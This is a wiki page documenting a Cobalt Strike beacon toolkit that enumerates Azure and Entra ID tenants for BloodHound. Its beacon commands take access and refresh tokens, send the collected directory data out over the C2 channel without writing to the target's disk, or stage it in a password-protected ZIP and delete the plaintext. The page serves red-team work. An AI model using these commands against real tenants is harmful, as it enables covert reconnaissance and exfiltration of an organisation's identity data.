# Beacon downloads and archives

[English](Downloads-and-Archives.md) | [日本語](ja/Downloads-and-Archives.md)

[Wiki home](Home.md) | [Operator workflow](../README.md)

## Download mode (diskless operation)

Download mode is **ON by default** when `bark.cna` loads. It redirects `*_bh`
output through Cobalt Strike's C2 download channel; files appear in the
teamserver's Downloads tab without ever touching the target disk.

```
beacon> bark_download_mode on
beacon> bark_get_entra_users_bh <token>
[+] Downloaded AZUser_20250621_143022.json (28410 bytes)
```

Turn it off only when target-side files are intentionally required, including
temporary staging for an umbrella password-protected ZIP:

```
beacon> bark_download_mode off
```

| Command | Description |
|---|---|
| `bark_download_mode on\|off` | Toggle download mode for all BH BOFs (default: `on`) |
| `bark_clear_role_downloads` | Clear the captured role-assignment download cache (see below) |

### Diskless graph conversion

`bark_convert_az_role_assignments_to_graph_bh` normally reads role-assignment
JSON files from the target disk. When download mode is on, the CNA captures
completed ARM role-assignment downloads and stores their teamserver paths. The
ARM and all-info umbrella workflows automatically read those files, pack them
into a binary blob, and queue RoleGraph conversion after the ARM return
barrier. The BOF processes the data entirely in memory. The standalone
conversion command remains available when manual conversion is useful.

```
beacon> bark_download_mode on
beacon> bark_get_azurerm_info_bh <arm_token>
  ... (role assignment BOFs run, results download via C2) ...
[*] processing 5 in-memory segment(s)
[+] Downloaded AZRoleGraph_20250621_143500.json (12840 bytes)
[+] Downloaded AZNativeRBAC_20250621_143500.json (9412 bytes)
```

The conversion is hybrid. `AZNativeRBAC_*.json` contains only RBAC records
that BloodHound's AzureHound v3 ingest supports natively (including the
Owner/Contributor/User Access Administrator families and the supported
resource role-assignment wrappers). `AZRoleGraph_*.json` contains every
effective assignment as a namespaced `BARK_*` OpenGraph relationship,
including custom roles and built-in roles without a native BloodHound kind.

Each ARM umbrella resets its role-assignment capture cache before collection.
Use `bark_clear_role_downloads` only when manually discarding a partial run.

---

## Password-protected ZIP collection

The `bark_zip_collect` BOF gathers every `AZ*.json` file in the
current directory into a **single password-protected ZIP**, then
**deletes the original JSON files** so no plaintext is left behind.

The umbrella collectors accept an optional trailing `password` argument that
automatically chains `bark_zip_collect` after the last sub-BOF finishes. First
switch download mode OFF so the JSON can be staged. While mode is ON, a
supplied password is ignored with a warning and collection stays diskless:

```
beacon> bark_download_mode off
beacon> bark_get_entra_info_bh   <msgraph_token> MyStrongPassword!
beacon> bark_get_azurerm_info_bh <arm_token>     MyStrongPassword!
beacon> bark_get_all_info_bh_rt  <tenantId> <refreshToken> MyStrongPassword!
```

The result is a single `bark_collect_yyyyMMdd_HHmmss.zip` containing
all the individual BloodHound JSON files.

The intermediate JSON is written only while staging mode is OFF. The final
encrypted ZIP always uses `BeaconDownload()`, and the plaintext JSON is
deleted. Large ZIPs are split into 256 KiB in-memory chunks.
BARK may reassemble the parts locally after every part reports completion, but
the operator can always perform the reassembly manually. Do not pass a `.part`
file directly to `unzip` or `bark_decrypt.py`.

After all parts report download completion, concatenate them in filename order:

```bash
base=bark_collect_20260724_093845.zip
cat "$base".part??? > "${base%.zip}_reassembled.zip"
zipinfo -t "${base%.zip}_reassembled.zip"
```

Then extract the reassembled ZIP locally on the operator machine:

```bash
python3 bark_decrypt.py \
  "${base%.zip}_reassembled.zip" \
  'MyStrongPassword!' \
  ./extracted
```

You can also run it manually after any number of individual `*_bh`
BOFs:

```
beacon> bark_download_mode off
beacon> bark_get_entra_users_bh  <token>
beacon> bark_get_entra_groups_bh <token>
beacon> bark_zip_collect MyStrongPassword!
```

The ZIP uses standard PKWARE ZipCrypto encryption (STORE compression).
Any standard tool can extract it:

```bash
zipinfo -t bark_collect_20250520_123456.zip
unzip -P MyStrongPassword! bark_collect_20250520_123456.zip
7z   x  -pMyStrongPassword! bark_collect_20250520_123456.zip
```

On Windows, right-click -> *Extract All* in Explorer prompts for the
password and decompresses in one shot.

A convenience Python helper is bundled:

```bash
python3 bark_decrypt.py bark_collect_20250520_123456.zip MyStrongPassword!
python3 bark_decrypt.py --batch MyStrongPassword!                       # all *.json.zip in CWD
python3 bark_decrypt.py --batch MyStrongPassword! --merge bloodhound.json  # ...merge into one BH envelope
```

> **Security note:** ZipCrypto is the legacy ZIP encryption format.
> It is used here for universal compatibility with `unzip` / 7-Zip /
> Explorer. For stronger confidentiality, re-pack with 7-Zip's
> AES-256 mode or layer `gpg -c` on top.
